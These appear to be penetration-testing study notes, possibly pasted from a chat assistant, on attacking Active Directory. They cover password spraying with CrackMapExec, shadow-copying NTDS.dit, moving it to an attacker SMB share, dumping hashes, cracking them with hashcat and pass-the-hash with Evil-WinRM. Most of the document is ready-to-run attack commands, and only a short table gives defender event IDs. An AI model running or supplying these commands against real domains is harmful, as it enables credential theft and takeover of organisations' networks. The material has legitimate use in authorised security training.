ğŸ§  Context Recap: What Is NTDS.dit?
The NTDS.dit is the Active Directory database:

Stores all domain user accounts and their password hashes.

Lives on domain controllers at:

makefile
Copy
Edit
C:\Windows\NTDS\NTDS.dit
To access it:

You need Domain Admin or local admin on a DC.

The file is locked during OS runtime, so we need Volume Shadow Copy (VSS) to grab it safely.

ğŸ¹ Phase 1: Initial AD Enumeration & Creds
Before dumping NTDS, you need:

A foothold on the internal network

A valid user credential, often obtained via:

Password spraying

LSASS dump

SAM dump

Phishing

CVEs

OSINT + brute/dictionary attack (CrackMapExec style)

ğŸ§ª AD Dictionary Attack Flow (with CrackMapExec)
bash
Copy
Edit
crackmapexec smb <DC-IP> -u <userlist.txt> -p <passlist.txt>
Example:

bash
Copy
Edit
crackmapexec smb 10.129.201.57 -u usernames.txt -p /usr/share/wordlists/fasttrack.txt
âœ… Successful login will be shown in green with [+]

âŒ Failure will be marked with STATUS_LOGON_FAILURE

â˜ ï¸ Be careful â€” you can trigger account lockouts if GPOs are in place (watch for event ID 4740 in logs)

ğŸ”¥ Tip: Always craft your userlists carefully using tools like username-anarchy or even scraping PDFs, company emails, etc.

ğŸ§  Phase 2: NTDS.dit Extraction
âœ… Method 1: Manual Extraction w/ Evil-WinRM
Login to the DC

bash
Copy
Edit
evil-winrm -i <IP> -u <domain user> -p <password>
Create a VSS snapshot

powershell
Copy
Edit
vssadmin create shadow /for=C:
Copy the NTDS.dit from the snapshot

powershell
Copy
Edit
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
Transfer to your attack box

powershell
Copy
Edit
cmd.exe /c move C:\NTDS\NTDS.dit \\<attackerIP>\CompData
âœ… Method 2: CrackMapExec One-Liner
bash
Copy
Edit
crackmapexec smb <DC-IP> -u <user> -p <pass> --ntds
Automatically does:

VSS snapshot

Copies NTDS.dit and SYSTEM

Dumps all the hashes

Logs results to ~/.cme/logs/

ğŸ§  Includes NTLM, Kerberos keys, and even krbtgt (ğŸ§¨ used for Golden Ticket attacks in later modules)

ğŸ§© Bonus: Cracking or Using Hashes
ğŸ”“ Cracking NTLM Hash (same as SAM section):
bash
Copy
Edit
hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
ğŸ’€ Pass-The-Hash with Evil-WinRM:
bash
Copy
Edit
evil-winrm -i <IP> -u <user> -H <NTLM hash>
Even if you canâ€™t crack it â€” you can often authenticate with the hash itself. This is the real power of NTLM and PTH.

ğŸ” Defenderâ€™s POV â€“ Detection & Logging
Action	Event ID	Log Source
Dictionary attack	4771 or 4625	Security
VSS creation	513	System
NTDS.dit access	4663 (if auditing enabled)	Security
PTH Authentication	4624 w/ no pre-auth data	Security
ğŸ§  TL;DR Flow â€“ "Attacking AD + NTDS.dit"
text
Copy
Edit
[âœ“] Valid user or admin access? 
    â†’ No â†’ Spray / Enumerate / Dump LSASS / SAM / Phish

[âœ“] Foothold?
    â†’ Yes â†’ Evil-WinRM or CrackMapExec

[âœ“] Admin access to DC?
    â†’ Yes â†’ Proceed to dump NTDS.dit

Method 1 (manual):
    - Create VSS
    - Copy from \\?\GLOBALROOT\Device\...
    - Transfer over SMB

Method 2 (auto):
    - CME --ntds

[âœ“] Got hashes?
    â†’ Crack with hashcat
    â†’ Or Pass-the-Hash with Evil-WinRM
